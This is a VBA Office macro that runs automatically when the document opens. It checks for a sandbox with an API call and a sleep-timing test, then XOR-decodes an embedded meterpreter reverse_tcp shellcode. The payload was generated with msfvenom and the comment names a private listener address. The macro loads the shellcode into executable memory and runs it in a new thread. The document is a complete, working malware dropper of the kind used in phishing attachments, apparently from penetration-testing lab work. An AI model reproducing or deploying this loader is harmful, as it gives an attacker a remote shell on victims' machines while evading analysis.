Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare Function FlsAlloc Lib "kernel32" (ByVal lpCallback As Long) As Long


Function MyMacro()

    Dim buf As Variant
    Dim tmp As Long
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    ' Check if we're in a sandbox by calling a rarely emulated API
    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If
    
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If
    
    ' specific sliver stager pointing to stage-listener on port 8064
    ' msfvenom --platform windows --arch x64 -p windows/meterpreter/reverse_tcp LHOST=192.168.45.228 LPORT=8086 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
    buf = Array(157,137,238,97,97,97,1,232,132,80,179,5,234,51,81,234,51,109,234,51,117,234,19,73,80,158,110,214,43,71,80,161,205,93,0,29,99,77,65,160,174,108,96,166,40,20,142,51,54,234,51,113,234,35,93,96,177,234,33,25,228,161,21,45,96,177,234,41,121,234,57,65,49,96,178,228,168,21,93,40,234, _
85,234,96,183,80,158,80,161,160,174,108,205,96,166,89,129,20,149,98,28,153,90,28,69,20,129,57,234,57,69,96,178,7,234,109,42,234,57,125,96,178,234,101,234,96,177,232,37,69,69,58,58,0,56,59,48,158,129,57,62,59,234,115,136,225,158,158,158,60,9,82,83,97,97,9,22,18,83,62,53, _
9,45,22,71,102,232,137,158,177,217,241,96,97,97,72,165,53,49,9,72,225,10,97,158,180,11,107,9,161,201,76,133,9,99,97,126,247,232,135,49,49,49,49,33,49,33,49,9,139,110,190,129,158,180,246,11,113,55,54,9,248,196,21,0,158,180,228,161,21,107,158,47,105,20,141,137,6,97,97,97, _
11,97,11,101,55,54,9,99,184,169,62,158,180,226,153,97,31,87,234,87,11,33,9,97,113,97,97,55,11,97,9,57,197,50,132,158,180,242,50,11,97,55,50,54,9,99,184,169,62,158,180,226,153,97,28,73,57,9,97,33,97,97,11,97,49,9,106,78,110,81,158,180,54,9,20,15,44,0,158,180, _
63,63,158,109,69,110,228,17,158,158,158,136,250,158,158,158,96,162,72,167,20,160,162,218,129,124,75,107,9,199,244,220,252,158,180,93,103,29,107,225,154,129,20,100,218,38,114,19,14,11,97,50,158,180)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("a")
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


